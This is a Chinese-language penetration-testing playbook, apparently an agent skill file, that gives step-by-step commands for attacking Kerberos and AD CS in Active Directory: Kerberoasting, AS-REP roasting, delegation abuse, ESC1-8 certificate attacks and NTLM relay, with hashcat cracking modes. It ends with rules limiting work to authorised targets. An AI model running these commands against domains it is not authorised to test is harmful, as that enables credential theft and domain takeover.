# Kerberos 路径速判（kerberos-paths）

> 从“有一个域账号”到“拿到可复现的高权凭据”，先选路径再敲命令。
> 配套：`references/kerberos-and-adcs.md`、`Tool/skill/_pending/ad-cloud/SKILL.md`。

## 1. 先固定基本盘

```bash
export DOMAIN=corp.local DC=10.0.0.10 USER=alice PASS='P@ssw0rd'
sudo chronyc makestep 2>/dev/null || sudo ntpdate -u "$DC"
nxc smb "$DC" --pass-pol -u '' -p ''
impacket-findDelegation "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
```

先确认：域名/DC、当前账号权限、锁定阈值、时钟。认证失败 2 次即停。

## 2. 路径选择

| 条件 | 路径 | 第一条命令 |
|---|---|---|
| 有 SPN、账号可注册 | Kerberoast | `GetUserSPNs ... -request-user <svc>` |
| `DONT_REQ_PREAUTH` | AS-REP | `GetNPUsers ... -request-user <user> -no-pass` |
| 可控 Unconstrained 主机 | 捕获 TGT | `Rubeus monitor` / 导出票据 |
| `msDS-AllowedToDelegateTo` | Constrained | `getST -spn ... -impersonate` |
| 可写目标 RBCD 属性 | RBCD | `addcomputer` + `rbcd.py` |
| 模板 SAN/Any Purpose/ACL | ADCS | `certipy find -vulnerable` |
| CA HTTP 端点 + 可强制认证 | ESC8/relay | `certipy relay` / `ntlmrelayx --adcs` |

## 3. Roast：先降噪再破解

```bash
# Kerberoast（单账号）
GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip "$DC" -request-user '<svc>' \
  -outputfile kerb.hash
# AS-REP（单账号）
GetNPUsers.py "$DOMAIN/" -dc-ip "$DC" -request-user '<user>' -no-pass \
  -format hashcat -outputfile asrep.hash
```

```bash
hashcat -m 13100 kerb.hash wordlist.txt     # RC4 TGS
hashcat -m 19700 kerb.hash wordlist.txt     # AES128 TGS
hashcat -m 19800 kerb.hash wordlist.txt     # AES256 TGS
hashcat -m 18200 asrep.hash wordlist.txt    # RC4 AS-REP
hashcat -m 19900 asrep.hash wordlist.txt    # AES256 AS-REP
```

判据：破解出明文，或 hash 可直接复用；仅拿到 hash = 素材。
失败：仅 AES 账号用 RC4 模式、账号锁定、无预认证条件。

## 4. 委派：看属性，不靠猜

- Unconstrained：控制被委派主机 -> 让高权账号/主机认证 -> 捕获 TGT -> 导入使用。
- Constrained：`getST.py -spn cifs/<target> -impersonate administrator ...`；`KRB5CCNAME` + `wmiexec -k -no-pass`。
- RBCD：写 `msDS-AllowedToActOnBehalfOfOtherIdentity` -> `getST`；需要目标对象写权限。
- 判据：以目标身份拿到服务票据并完成远程执行；只有属性存在不算。

## 5. ADCS：ESC1-8 的选择

| ESC | 触发条件 | 关键动作 | 判据 |
|---|---|---|---|
| 1 | SAN + 低权 Enroll | `certipy req -upn administrator` | `certipy auth` 拿到 TGT |
| 2 | Any Purpose/无 EKU | `certipy req` 后用于客户端认证 | 目标服务接受证书 |
| 3 | 注册代理 | 先拿 CRA，再 `-on-behalf-of` | 代签出目标证书并 auth |
| 4 | 模板 ACL 可写 | `certipy template -save-old` -> 改配置 -> ESC1 | 修改成功 + auth |
| 5 | PKI 对象 ACL | `dacledit` 写 CA/模板对象 | 能完成 ESC4/7 利用 |
| 6 | CA 允许 SAN | 任意模板 `-upn` | 非 ESC1 模板也签发目标 SAN |
| 7 | ManageCA/ManageCertificates | `certipy ca -add-officer/-issue-request` | 批准并取回证书 |
| 8 | HTTP 注册 + NTLM | `certipy relay`/`ntlmrelayx --adcs` | 拿到证书并 auth |

`certipy find -vulnerable` 只是线索；必须确认 Enroll、EKU、审批、CA flag、EPA/signing。

## 6. 失败判据

| 现象 | 原因 | 处理 |
|---|---|---|
| `KRB_AP_ERR_SKEW` | 时钟偏移 | 同步后重试一次 |
| `STATUS_ACCOUNT_LOCKED_OUT` | 触发锁定 | 立即停，报告 |
| `certipy req` 拒绝 | 无 Enroll/审批/SAN | 查模板 ACL/EKU |
| `certipy auth` 失败 | 证书用途/链/撤销 | 查 EKU、NTAuth、撤销 |
| relay 无会话 | signing/EPA | 换目标/改 ADCS HTTP |
| `getST` 失败 | SPN/委派属性错 | 核对属性 |

## 7. 证据与边界

- 记录：源主体 -> 动作 -> 目标主体 -> 结果，附命令/时间/返回。
- 凭据只留指纹/有效期；证书/票据不打印全量。
- 清理：临时计算机账号、证书请求、上传工具；恢复模板/ACL（若有备份）。
- 只在授权域/账号/主机操作；不做持久化、后门、批量喷洒。
